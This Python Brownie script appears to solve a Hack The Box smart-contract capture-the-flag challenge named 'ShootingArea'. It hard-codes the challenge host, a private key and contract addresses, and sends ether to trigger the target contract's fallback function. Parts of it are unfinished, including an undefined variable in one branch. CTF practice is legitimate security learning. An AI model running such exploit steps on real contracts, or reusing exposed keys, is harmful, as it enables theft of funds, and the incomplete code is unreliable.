#!/usr/bin/python3
#from brownie import ShootingArea, Setup, web3
from brownie import *
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

"""
nc 178.62.3.170 32481

brownie networks add Ethereum HTB host=http://165.232.98.11:32418 chainid=1337


Private key     :  0x575d4cba1d2925c392dd3ffa9e53eeb41826813dd1ab96b8d5996522f076d5c5
Address         :  0xD1Ec39bA6b0a51234eaBe25308B473aA7dD8C0B5
Target contract :  0x657eF9f3645A61D1A8cC929771cA78Bd498A8723
Setup contract  :  0x21c2e7498E2D557dcd0EC3CEc9290fce9f4696e5


"""

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET

abi = [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "TARGET",
      "outputs": [
        {
          "internalType": "contract ShootingArea",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "isSolved",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ]

def hack(contract_address=None, attacker=None):
	if not contract_address:
		stp, sa, owner = deploy()
		# contract_address = un.address
		#print(contract_address, owner)
		_, attacker = get_account()
	else:
		#shooting_area = Contract("0x657eF9f3645A61D1A8cC929771cA78Bd498A8723")
		#shooting_area = Contract.from_abi("shootingArea", "0x657eF9f3645A61D1A8cC929771cA78Bd498A8723", abi)
		shooting_area = ShootingArea.at("0x657eF9f3645A61D1A8cC929771cA78Bd498A8723")
		stp = Setup.at("0x21c2e7498E2D557dcd0EC3CEc9290fce9f4696e5")

	#print(stp.abi)
	print(shooting_area.abi)
	#print(shooting_area.address)
	#print(web3.fromWei(attacker.balance(), "ether"))
	
	# invoke the fallback funciton
	attacker.transfer(shooting_area.address, "1 ether", 10000000)
	
	# tx = un.updateSensors(10, {"from": attacker})
	# tx.wait(1)
	
	# print(f"{green}Update Sensors: {red}{un.updated()}")
	# print(f"{green}Solved: {red}{st.isSolved()}{reset}")
	



def main(contract_address=None):
	if contract_address:
		hack(contract_address, get_account())
	else:
		hack()

if __name__ == '__main__':
	main()